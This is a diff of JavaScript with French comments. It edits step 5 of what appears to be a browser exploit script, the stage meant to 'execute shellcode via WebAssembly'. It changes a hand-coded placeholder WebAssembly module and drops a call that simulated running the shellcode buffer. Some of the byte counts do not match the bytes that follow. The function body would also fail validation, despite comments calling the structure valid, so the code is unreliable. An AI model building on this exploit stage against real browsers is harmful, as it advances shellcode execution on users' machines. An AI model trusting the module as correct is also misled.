@@ -82,30 +82,28 @@
 
         // Étape 5 : Exécuter le shellcode via WebAssembly
         function executeShellcode(buffer) {
-            // Module WebAssembly fictif corrigé
-            // Structure valide avec sections Type, Import, Function, Export, Code
+            // Module WebAssembly fictif corrigé (structure valide)
             let wasmCode = new Uint8Array([
                 0x00, 0x61, 0x73, 0x6d, // Magic number WebAssembly
                 0x01, 0x00, 0x00, 0x00, // Version
-                // Section Type (une fonction sans paramètres, sans retour)
-                0x01, 0x06, 0x01,       // Type section, 1 type, 6 octets
+                // Section Type (1 type : fonction sans paramètres ni retour)
+                0x01, 0x05, 0x01,       // Type section, taille 5, 1 type
                 0x60, 0x00, 0x00,       // Fonction sans paramètres ni retour
-                // Section Import (importer une mémoire pour le buffer)
-                0x02, 0x0d, 0x01,       // Import section, 1 import
+                // Section Import (importer une mémoire)
+                0x02, 0x0d, 0x01,       // Import section, taille 13, 1 import
                 0x03, 0x65, 0x6e, 0x76, // Module "env"
                 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, // Nom "memory"
                 0x02, 0x00, 0x01,       // Mémoire, limites 0-1
-                // Section Function (une fonction)
-                0x03, 0x02, 0x01, 0x00, // Function section, 1 fonction, type 0
+                // Section Function (1 fonction)
+                0x03, 0x02, 0x01, 0x00, // Function section, taille 2, 1 fonction, type 0
                 // Section Export (exporter la fonction main)
-                0x07, 0x07, 0x01,       // Export section, 1 export
+                0x07, 0x07, 0x01,       // Export section, taille 7, 1 export
                 0x04, 0x6d, 0x61, 0x69, 0x6e, // Nom "main"
                 0x00, 0x00,             // Exporte la fonction 0
-                // Section Code (code de la fonction)
-                0x0a, 0x0a, 0x01,       // Code section, 1 fonction
-                0x08, 0x00,             // Taille du code (8 octets)
+                // Section Code (1 fonction)
+                0x0a, 0x06, 0x01,       // Code section, taille 6, 1 fonction
+                0x04, 0x00,             // Taille du code (4 octets)
                 0x41, 0x00,             // i32.const 0 (pointeur vers buffer)
-                0x10, 0x00,             // call 0 (simule exécution du buffer)
                 0x0b                    // end
             ]);
 
